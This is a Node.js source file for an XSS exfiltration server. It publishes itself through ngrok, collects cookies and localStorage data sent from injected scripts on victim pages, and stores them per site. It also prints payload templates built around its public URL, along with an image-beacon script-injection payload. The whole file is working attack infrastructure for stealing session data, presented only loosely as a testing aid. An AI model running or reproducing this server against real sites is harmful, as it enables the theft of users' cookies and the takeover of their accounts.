const ip = require('ip').address()
const ngrok = require('ngrok')
const express = require('express')
const bodyP = require('body-parser')
const app = express()
const ora = require('ora')
const spinner = ora('')
const fs = require('fs')
const path = require('path')
const textColors = require('colors')

// examples
const examples = {
    cookie: require(path.join(__dirname + '/payloads/cookie.json')),
    localstorage: require(path.join(__dirname + '/payloads/localstorage.json'))
}

exports.start = async (port) => {
    port = process.env.port || port

    app.use(bodyP.json())
    app.use(bodyP.urlencoded({ extended: true, limit: '50mb' }))

    app.get('/cookie', async (req, res) => {
        let { query } = req.query

        let next = await succeed('Find a connection')
        if (next) {
            spinner.start()
            spinner.color = 'yellow'
            spinner.text = `Runing XSS on ${req.headers.referer}...`

            let finish = await succeed(`Runing XSS on ${req.headers.referer}...`)
            if (finish) {
                let name = req.headers.referer.replace('http://', '')
                name = name.substring(0, name.indexOf('/'))
                await saveFile({ folder: name, name: `cookie`, data: query })
                spinner.start('Awaiting connection...')
            }
        }
    })

    app.get('/localstorage', async (req, res) => {
        let { query } = req.query

        let next = await succeed('Find a connection')
        if (next) {
            spinner.start()
            spinner.color = 'yellow'
            spinner.text = `Runing XSS on ${req.headers.referer}...`

            let finish = await succeed(`Runing XSS on ${req.headers.referer}...`)
            if (finish) {
                let name = req.headers.referer.replace('http://', '')
                name = name.substring(0, name.indexOf('/'))
                await saveFile({ folder: name, name: `localstorage`, data: query })
                spinner.start('Awaiting connection...')
            }
        }
    })

    app.get('/console', async (req, res) => {
        let { log } = req.query
        let origin = req.headers.referer || req.headers['x-forwarded-for']

        let next = await succeed('Find a connection')
        if (next) {
            spinner.start()
            spinner.color = 'yellow'
            spinner.text = `Runing code on ${origin}...`

            let finish = await succeed(`Runing code on ${origin}...`)
            if (finish) {
                spinner.info(`param received: ${log}`)
                spinner.info(`site is vulnerable`, '\r\n')
                console.log('\r\n')
                spinner.start('Awaiting connection...')
            }
        }
    })

    app.listen(port, async () => {
        spinner.info('Simple server to test XSS scripts 🐱‍💻\r\n\r\n')
        spinner.succeed('Server started')
        const pURL = await ngrok.connect({ proto: 'http', addr: port })

        spinner.info(`local: http://${ip}:${port}`)
        spinner.info(`public: ${pURL}`)
        // urls
        printExamples(pURL)

        spinner.start('Awaiting connection...')
    })
}

async function saveFile({ folder, name, data }) {
    let file = path.join(__dirname + `/../../outputs/${folder}/${name}.json`)
    let filepath = path.join(__dirname + `/../../outputs/${folder}`)
    const fileExists = await fs.existsSync(file)

    if (!await fs.existsSync(filepath)) {
        await fs.mkdirSync(filepath)
    }
    if (!fileExists) {
        try {
            let date = new Date
            await fs.writeFileSync(file, JSON.stringify([{ [`log-${date}`] : data }]))
            return spinner.info(`File created at: ${file}\r\n`)
        } catch(e) {
            return spinner.fail(`${e}\r\n`)
        }
    }

    if (fileExists) {
        let log = require(file)
        let date = new Date
        log.push({ [`log-${date}`] : data })
        try {
            await fs.writeFileSync(file, JSON.stringify(log))
            return spinner.info(`File updated at: ${file}\r\n`)
        } catch(e) {
            return spinner.fail(`${e}\r\n`)
        }
    }
}

async function succeed(text) {
    return new Promise((resolve, reject) => {
        setTimeout(() => {
            spinner.succeed(text)

            return resolve(true)
        }, 3000);
    })
}

function printExamples (url) {
    console.log('\r\n\r\n')
    const info = {
        cookie: {
            low: '',
            medium: ''
        },
        localstorage: {
            low: '',
            medium: ''
        }
    }

    for (let example of examples.cookie.low) {
        info.cookie.low += '\r\n' + example.replace(/\$URL/g, url)
    }
    for (let example of examples.localstorage.low) {
        info.localstorage.low += '\r\n' + example.replace(/\$URL/g, url)
    }
    for (let example of examples.cookie.medium) {
        info.cookie.medium += '\r\n' + example.replace(/\$URL/g, url)
    }
    for (let example of examples.localstorage.medium) {
        info.localstorage.medium += '\r\n' + example.replace(/\$URL/g, url)
    }
    spinner.info('Low Security'.green)
    console.log(info.cookie.low)
    console.log(info.localstorage.low)
    console.log('\r\n\r\n')
    spinner.info('Medium Security'.yellow)
    console.log(info.cookie.medium)
    console.log(info.localstorage.medium)
    console.log('\r\n\r\n')
    spinner.info('Test site'.blue)
    console.log(`<script>new Image().src = '${url}/console?log=XSS'</script>\r\n\r\n`)
}